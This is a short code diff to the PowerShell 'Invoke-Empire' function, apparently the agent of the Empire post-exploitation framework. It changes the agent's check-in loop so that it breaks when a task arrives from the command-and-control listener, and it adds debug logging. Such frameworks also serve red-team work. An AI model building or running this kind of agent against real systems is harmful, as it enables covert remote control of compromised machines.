@@ -772,7 +772,9 @@ function Invoke-Empire {
 			if ($JobResults) {
 				((& $SendMessage -Listener $l -Packets $JobResults))
 			}
-			((& $script:GetTask -Listener $l))
+			if ((& $script:GetTask -Listener $l)){
+                break
+            }
 		}
 		((& $script:CleanUpListeners))
 	}
@@ -781,7 +783,7 @@ function Invoke-Empire {
 		param($Listener, $Packets)
         "called send message" | Out-File "out.log" -Append -NoClobber
         $Packets | Out-File "out.log" -Append -NoClobber
-        (& $Listener["send_func"] -Packets $Packets -FixedParameters $Listener["fixed_parameters"])
+        ((& $Listener["send_func"] -Packets $Packets -FixedParameters $Listener["fixed_parameters"]))
 	}
 
 	$script:GetTask = {
@@ -794,12 +796,14 @@ function Invoke-Empire {
         $TaskData|Out-File "out.log" -Append -NoClobber
 		if (!$TaskData){
 			$Listener['missedCheckins'] += 1
+            $False
 		}
 		else {
 			if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $Listener['defaultResponse']) {
                 "got something not equal to defaultResponse, calling decoderoutingpacket"
 				Decode-RoutingPacket -PacketData $TaskData
 			}
+            $True
 		}
 	}
 
